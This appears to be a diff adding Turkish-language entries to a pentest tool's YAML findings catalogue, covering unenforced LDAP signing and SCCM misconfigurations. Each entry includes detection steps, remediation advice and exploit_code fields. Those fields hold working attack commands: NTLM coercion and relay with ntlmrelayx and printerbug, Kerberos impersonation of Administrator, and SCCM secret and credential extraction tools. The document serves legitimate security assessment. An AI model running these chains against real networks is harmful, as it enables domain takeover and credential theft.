@@ -1744,3 +1744,189 @@ mssql-access:
     kısıtla, Windows auth tercih et.
   references:
     - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server"
+
+ldap-signing-disabled:
+  title: "LDAP signing zorunlu değil (NTLM relay → LDAP)"
+  severity: high
+  category: config
+  phase: ad
+  manual_only: true
+  tags: [relay, ldap, rbcd, shadow-credentials]
+  summary: "DC LDAP imzası/channel binding zorlamıyor; coerce edilen hesap LDAP'a relay edilebilir."
+  description: >
+    DC LDAP signing'i zorunlu kılmıyorsa (nxc banner: signing:None), coercion ile
+    yakalanan bir makine hesabının NTLM kimlik doğrulaması DC'nin LDAP'ına relay
+    edilebilir: RBCD yazma, Shadow Credentials ekleme, makine hesabı oluşturma.
+    channel binding "Never" ise LDAPS'e relay de mümkündür. SCCM ortamında site
+    sunucusu coerce edilip bu yolla devralınabilir (TAKEOVER-8).
+  detect_code: |
+    # ad modülü — nxc ldap banner'ı (signing / channel binding)
+    nxc ldap <dc> -u user -p pass
+    #   ... (signing:None) (channel binding:Never)  → zorunlu değil
+  exploit_code: |
+    # MANUEL — coerce + LDAP relay + RBCD
+    impacket-ntlmrelayx -t ldap://<dc> --delegate-access -smb2support
+    printerbug.py DOM/user:pass@<kurban> <saldirgan-ip>
+    impacket-getST -spn cifs/<kurban-fqdn> -impersonate Administrator 'DOM/<yeni$>:<parola>' -dc-ip <dc>
+  remediation: >
+    GPO: "Domain controller: LDAP server signing requirements" = Require signing;
+    "LDAP server channel binding token requirements" = Always. Sonrasında olay
+    günlüğünde 2889 (imzasız bind) kayıtlarını izleyin.
+  references:
+    - "https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-ldap-signing-in-windows-server"
+
+sccm-detected:
+  title: "SCCM / MECM altyapısı tespit edildi"
+  severity: info
+  category: info
+  phase: sccm
+  manual_only: false
+  tags: [sccm, mecm, recon]
+  summary: "Site kodu, site sunucusu, MP, DP, PXE ve site DB adayları (RECON-1/2/3)."
+  description: >
+    SCCM site bilgisini AD'ye yayınlar (CN=System Management); herhangi bir domain
+    kullanıcısı MP ve site kodunu okuyabilir (RECON-1). MP'nin mplist uç noktası
+    anonim olarak MP listesini ve HTTPS durumunu verir (RECON-3). SMB rol paylaşımları
+    (SMS_<site> = site sunucusu, SMS_DP$/SCCMContentLib$ = DP, REMINST = PXE) rolleri
+    ele verir (RECON-2). Site veritabanı AD'de yayınlanmaz; SQL (MSSQLSvc SPN)
+    çalıştıran bir SCCM site sistemi uzak site DB adayıdır.
+  detect_code: |
+    # sccm modülü (salt-okuma)
+    nxc ldap <dc> -u user -p pass --query "(objectClass=mSSMSManagementPoint)" "dNSHostName mSSMSSiteCode"
+    curl "http://<mp>/sms_mp/.sms_aut?mplist"
+    nxc smb <sccm-hostlar> -u user -p pass --shares        # SMS_<site>, SMS_DP$, REMINST
+    nxc ldap <dc> -u user -p pass --query "(servicePrincipalName=MSSQLSvc*)" "servicePrincipalName"
+  exploit_code: |
+    # Keşif araçları (MANUEL; sccmhunter -debug olmadan sessiz kalabilir)
+    sccmhunter.py find -u user -p pass -d dom.local -dc-ip <dc> -debug
+    sccmhunter.py smb  -u user -p pass -d dom.local -dc-ip <dc> -debug
+  remediation: >
+    Bilgi amaçlıdır. Site sistemlerinin envanterini tutun; aşağıdaki SCCM
+    bulgularındaki sertleştirmeleri uygulayın.
+  references:
+    - "https://github.com/subat0mik/Misconfiguration-Manager"
+
+sccm-mp-http:
+  title: "SCCM Management Point HTTP kabul ediyor (CRED-2)"
+  severity: high
+  category: config
+  phase: sccm
+  manual_only: true
+  tags: [sccm, cred-2, naa, policy]
+  summary: "MP politikayı HTTP ile veriyor; tanımlı NAA/değişken sırları sahte cihaz kaydıyla okunabilir."
+  description: >
+    İstemciler makine politikasını MP'den alır. MP HTTPS/PKI zorlamıyorsa
+    (mplist SSLState=0) herhangi bir domain hesabı sahte bir cihaz kaydedip
+    politikayı isteyebilir. Politika; Network Access Account (NAA), collection ve
+    task sequence değişkenlerini güçlü şifreleme olmadan (obfuscation) taşır →
+    düz metne çevrilir. Sır tanımlı değilse etkisi sınırlıdır; bu yüzden varlığı
+    manuel doğrulanır.
+  detect_code: |
+    curl "http://<mp>/sms_mp/.sms_aut?mplist"
+    #   <Property Name="SSLState" Value="0"/>  → HTTP MP
+  exploit_code: |
+    # MANUEL (Kali) — -auto bayrağı kayıt + politika isteme + çözmeyi yapar
+    sccmhunter.py http -u user -p pass -d dom.local -dc-ip <dc> -auto
+    # Windows foothold:
+    SharpSCCM.exe get secrets
+  remediation: >
+    NAA kullanmayın (Enhanced HTTP veya PKI ile değiştirin), HTTPS/PKI'yi zorlayın,
+    task sequence/collection değişkenlerine düz kimlik koymayın, eski NAA
+    hesaplarının parolasını değiştirip devre dışı bırakın.
+  references:
+    - "https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-2/cred-2_description.md"
+
+sccm-pxe:
+  title: "SCCM PXE etkin dağıtım noktası (CRED-1 / ELEVATE-4)"
+  severity: medium
+  category: config
+  phase: sccm
+  manual_only: true
+  tags: [sccm, pxe, cred-1, elevate-4]
+  summary: "DP PXE yanıtlıyor; parolasızsa boot medyasından NAA/TS sırları çıkar."
+  description: >
+    PXE etkin bir DP (REMINST paylaşımı), ağdaki herhangi bir cihazın PXE boot
+    isteğine boot medyası ve değişken dosyası sunar. PXE parolası yoksa medya
+    anahtarı türetilebilir ve NAA, task sequence ve collection sırları
+    çıkarılabilir; medya sertifikası DP'yi taklit etmek için de kullanılır.
+    Parola durumu pasif olarak uzaktan bilinemez — PXE isteği manuel atılır
+    (aynı L2 segment gerekir).
+  detect_code: |
+    nxc smb <dp> -u user -p pass --shares      # REMINST → PXE
+  exploit_code: |
+    # MANUEL — root, bridged, aynı L2 segment
+    sudo python3 pxethiefy.py explore -i eth0 -a <dp-ip>
+    # "Blank password ... found" → medya parolasız (explore tek başına çözer)
+    # Parolalıysa hash'i hashcat ile kırıp 'decrypt' kullan.
+  remediation: >
+    PXE'ye güçlü bir parola tanımlayın veya gereksizse PXE'yi kapatın; PXE ile
+    sunulan task sequence'lara kimlik gömmeyin; NAA kullanmayın.
+  references:
+    - "https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-1/cred-1_description.md"
+
+sccm-dp-loot:
+  title: "SCCM DP içeriği okunabilir (CRED-6)"
+  severity: medium
+  category: config
+  phase: sccm
+  manual_only: true
+  tags: [sccm, dp, cred-6, loot]
+  summary: "DP içerik kütüphanesi domain kullanıcısına açık; paketlerde gömülü kimlik aranabilir."
+  description: >
+    Dağıtım noktasının içerik kütüphanesi (SCCMContentLib$) ve paket paylaşımları
+    (SMSPKG<sürücü>$) tarayan hesap tarafından okunabiliyor. Dağıtılan paketlerdeki
+    script, unattend.xml ve yapılandırma dosyaları sıkça düz metin kimlik içerir.
+  detect_code: |
+    nxc smb <dp> -u user -p pass --shares      # SCCMContentLib$ READ
+  exploit_code: |
+    # MANUEL — içerik envanteri + ilginç uzantıları indir
+    python3 cmloot.py '\\<dp-fqdn>\SCCMContentLib$' -u user -p pass
+    # Windows: Invoke-CMLootInventory / Invoke-CMLootDownload
+  remediation: >
+    Paketlere düz metin kimlik koymayın; içerik paylaşımlarının okuma iznini
+    yalnız gereken hesaplarla sınırlayın; paketleri sır taraması için denetleyin.
+  references:
+    - "https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-6/cred-6_description.md"
+
+sccm-relay-takeover:
+  title: "SCCM site devralma relay zinciri (TAKEOVER / ELEVATE-1 / CRED-8)"
+  severity: critical
+  category: vuln
+  phase: sccm
+  manual_only: true
+  tags: [sccm, takeover, relay, coercion]
+  summary: "Coerce edilebilir site sunucusu + imzasız relay hedefi → site/hiyerarşi devralma."
+  description: >
+    Site sunucusunun makine hesabı yapısal olarak site veritabanında sysadmin ve
+    tüm site sistemlerinde local admin'dir. Site sunucusu coerce edilebiliyorsa
+    (PrinterBug/PetitPotam vb.) ve kimliği imza zorlamayan bir hedefe relay
+    edilebiliyorsa: uzak site DB'sine MSSQL relay → Full Administrator
+    (TAKEOVER-1) / politika sırları (CRED-8); signing kapalı site sistemine SMB
+    relay → SYSTEM (TAKEOVER-2 / ELEVATE-1); AD CS web enrollment (ESC8) →
+    sertifika (TAKEOVER-3); imzasız DC LDAP → RBCD (TAKEOVER-8). Kaynak ve hedef
+    farklı makine olmalıdır (NTLM reflection koruması). MSSQL relay ayrıca SQL
+    Extended Protection'ın kapalı olmasını gerektirir (uzaktan doğrulanamaz).
+  detect_code: |
+    # sccm modülü — korelasyon (relay ÇALIŞTIRILMAZ)
+    nxc smb <site-sunucusu> -u user -p pass -M coerce_plus    # coerce edilebilir mi
+    # + SMB signing (smb modülü), ESC8 / LDAP signing (ad modülü), SQL site sistemi (LDAP SPN)
+  exploit_code: |
+    # MANUEL — -smb2support ŞART (yoksa 'attacking target'ta takılır, socks boş kalır).
+    # Relay/mssqlclient'te IP kullan (FQDN AAAA'ya çözülürse proxychains SOCKS4 reddeder).
+    # TAKEOVER-1: site DB'ye MSSQL relay
+    sudo ntlmrelayx.py -t mssql://<db-ip> -smb2support -socks
+    printerbug.py DOM/user:pass@<site-sunucusu> <saldirgan-ip>
+    proxychains mssqlclient.py DOM/<SITE$>@<db-ip> -windows-auth   # parola boş
+    #   SELECT IS_SRVROLEMEMBER('sysadmin');  -- 1 = devralma
+    # TAKEOVER-2 / ELEVATE-1: site sistemine SMB relay
+    sudo ntlmrelayx.py -t smb://<site-sistemi-ip> -smb2support -c "whoami /all"
+    # TAKEOVER-3: AD CS (ESC8)
+    sudo ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template Machine
+  remediation: >
+    Tüm site sistemlerinde SMB signing zorunlu; site DB SQL'inde Extended
+    Protection; AD CS web enrollment'ta HTTPS + EPA; DC'de LDAP signing + channel
+    binding; site sunucularında Print Spooler kapalı ve EFSRPC filtreleri; NTLM'i
+    kısıtlayın. Site DB'yi mümkünse site sunucusuyla aynı makinede tutun.
+  references:
+    - "https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md"
+    - "https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/ELEVATE/ELEVATE-1/elevate-1_description.md"
